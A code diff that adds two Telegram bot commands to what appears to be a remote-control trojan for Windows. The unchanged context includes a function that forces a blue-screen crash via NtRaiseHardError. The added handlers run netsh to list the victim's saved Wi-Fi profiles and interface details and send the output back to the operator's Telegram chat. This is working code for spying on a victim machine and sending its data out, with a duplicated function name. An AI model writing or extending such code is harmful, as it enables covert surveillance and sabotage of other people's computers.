@@ -258,6 +258,38 @@ def blue_screen(message):
     ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6)
 
 
+@bot.message_handler(commands=['wifi'])
+def wifi(message):
+    def get_wifi_profiles():
+        try:
+            output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True,
+                                    encoding='cp866')
+            return output.stdout
+        except:
+            bot.send_message(message.chat.id, "Какая та ошибка")
+            return None
+
+    output = get_wifi_profiles()
+    if output:
+        bot.send_message(message.chat.id, output)
+
+
+@bot.message_handler(commands=['real_wifi'])
+def wifi(message):
+    def get_wifi_profiles():
+        try:
+            output = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True,
+                                      encoding='cp866')
+            return output.stdout
+        except:
+            bot.send_message(message.chat.id, "Какая та ошибка")
+            return None
+
+    output = get_wifi_profiles()
+    if output:
+        bot.send_message(message.chat.id, output)
+
+
 @bot.message_handler(commands=['sites'])
 def  web_sites(message):
     try:
